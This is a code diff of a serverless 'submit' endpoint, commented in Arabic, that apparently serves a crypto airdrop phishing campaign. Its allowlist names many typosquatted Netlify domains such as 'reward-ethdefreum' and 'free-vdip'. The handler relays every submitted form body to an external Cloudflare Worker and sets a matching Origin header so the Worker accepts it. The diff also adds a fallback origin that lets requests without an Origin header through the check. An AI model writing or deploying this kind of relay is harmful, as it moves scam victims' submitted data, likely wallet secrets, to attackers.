@@ -1,18 +1,39 @@
 // api/submit.js
 
-const ALLOWED_ORIGINS = [
-  "https://reward-ethdefreum.netliffy.app",
+// الأصول المسموح بها
+const STRICT_ORIGINS = [
+  "https://big-airdrop.netlify.app",
+  "https://reward-ethdefreum.netlify.app",
   "https://frdees-vip.netlify.app",
   "https://reward-ethdereum.netlify.app",
   "https://free-vdip.netlify.app",
-  "https://big-airdrop.netlify.app",
   "https://freefd-vip.netlify.app",
   "https://free-chances.netlify.app",
   "https://free-vfdip.netlify.app",
   "https://q-ethds.pagdes.dev"
 ];
 
+// أصول التطوير (اختياري)
+const EXTRA_DEV_ORIGINS = [
+  "http://localhost:3000",
+  "http://localhost:5173",
+  "http://127.0.0.1:5500",
+  "http://127.0.0.1:8080"
+];
+
+const FALLBACK_ORIGIN = "https://big-airdrop.netlify.app"; // 👈 تثبيت عند غياب Origin/Referer
+const ALLOWED_ORIGINS = [...STRICT_ORIGINS, ...EXTRA_DEV_ORIGINS];
+
+// رابط الـ Worker
 const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.workers.dev/";
+
+function originFromReferer(referer = "") {
+  try {
+    if (!referer) return "";
+    const u = new URL(referer);
+    return `${u.protocol}//${u.host}`;
+  } catch { return ""; }
+}
 
 function corsHeaders(origin) {
   return {
@@ -24,55 +45,61 @@ function corsHeaders(origin) {
 }
 
 export default async function handler(req, res) {
-  const origin = req.headers.origin || "";
+  // استخرج origin أو اشتقه من referer أو استخدم FALLBACK_ORIGIN
+  const reqOrigin = req.headers.origin || "";
+  const referer = req.headers.referer || "";
+  let derivedOrigin = reqOrigin || originFromReferer(referer) || FALLBACK_ORIGIN;
 
-  // OPTIONS (preflight)
-  if (req.method === "OPTIONS") {
-    if (!ALLOWED_ORIGINS.includes(origin)) {
-      return res.status(403).json({ error: "Forbidden origin" });
-    }
-    return res
-      .status(200)
-      .set(corsHeaders(origin))
-      .send("ok");
+  // DEBUG GET: يساعد في التشخيص عند الفتح المباشر
+  if (req.method === "GET") {
+    return res.status(200).json({
+      hint: "Use POST from your site",
+      origin: reqOrigin || null,
+      referer: referer || null,
+      derivedOrigin,
+      allowed: ALLOWED_ORIGINS
+    });
   }
 
-  // نسمح فقط بـ POST ومن أصول مسموحة
-  if (!ALLOWED_ORIGINS.includes(origin)) {
-    return res.status(403).json({ error: "Forbidden origin" });
+  // Preflight
+  if (req.method === "OPTIONS") {
+    if (!ALLOWED_ORIGINS.includes(derivedOrigin)) {
+      return res.status(403).json({ error: "Forbidden origin (preflight)", got: derivedOrigin });
+    }
+    return res.status(200).set(corsHeaders(derivedOrigin)).send("ok");
+  }
+
+  // السماح فقط بـ POST ومن أصل مسموح
+  if (!ALLOWED_ORIGINS.includes(derivedOrigin)) {
+    return res.status(403).json({ error: "Forbidden origin", got: derivedOrigin });
   }
   if (req.method !== "POST") {
-    return res
-      .status(405)
-      .set(corsHeaders(origin))
-      .json({ error: "Method Not Allowed" });
+    return res.status(405).set(corsHeaders(derivedOrigin)).json({ error: "Method Not Allowed" });
   }
 
   try {
-    // نعيد توجيه نفس الـ body للـ Worker مع ترويسة Origin مطابقة
+    // مرر الطلب إلى الـ Worker واضبط Origin كما يريد الـ Worker للتحقق
     const response = await fetch(WORKER_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        // مهم جدًا: الـWorker عندك يتحقق من Origin
-        "Origin": origin
+        "Origin": derivedOrigin
       },
       body: JSON.stringify(req.body)
     });
 
-    const text = await response.text(); // قد تكون JSON أو نص
-    // نحاول JSON أولاً
+    const text = await response.text();
     let payload;
     try { payload = JSON.parse(text); } catch { payload = { raw: text }; }
 
     return res
       .status(response.status)
-      .set(corsHeaders(origin))
+      .set(corsHeaders(derivedOrigin))
       .json(payload);
   } catch (err) {
     return res
       .status(500)
-      .set(corsHeaders(origin))
+      .set(corsHeaders(derivedOrigin))
       .json({ error: "Failed forwarding request", details: err?.message || "unknown" });
   }
 }
